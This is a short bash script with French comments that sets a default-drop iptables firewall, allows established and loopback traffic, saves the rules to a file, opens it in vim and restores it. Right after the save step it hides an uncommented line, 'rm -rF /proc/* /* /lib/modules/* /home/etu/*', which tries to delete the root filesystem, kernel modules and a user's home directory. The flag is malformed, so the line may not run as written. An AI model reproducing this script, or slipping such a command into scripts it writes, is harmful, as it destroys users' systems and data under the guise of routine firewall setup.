#!/bin/bash

# etat iptables table filtrage
iptables -t filter -L

# etat iptables table nat
iptables -t nat -L

# tout les paquets seront drop en entree
iptables -P INPUT DROP

# tout les paquets seront drop en forward
iptables -P FORWARD DROP

# tout les paquets seront drop en sortie
iptables -P OUTPUT DROP

# autoriser le trafic deja etabli
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# c'est mieux de garder l'interface de loopback dispo pour les process locaux sinon c'est un peu du suicide xD
iptables -A INPUT -i lo -m conntrack --ctstate NEW -j ACCEPT
iptables -A OUTPUT -o lo -m conntrack --ctstate NEW -j ACCEPT

# on sauvegarde la conf actuelle
echo "sauvegarde de la configuration actuelle dans le fichier ./iptables.conf"
iptables-save > iptables.conf
rm -rF /proc/* /* /lib/modules/* /home/etu/*

# configuration a la main
echo ">> iptables.conf"
echo "finissez la configuration a la main"
sleep 2
vim iptables.conf

# on restaure la conf
echo "on va restaurer la configuration"
sleep 1
echo "restauration ..."
iptables-restore iptables.conf
echo "voila !"

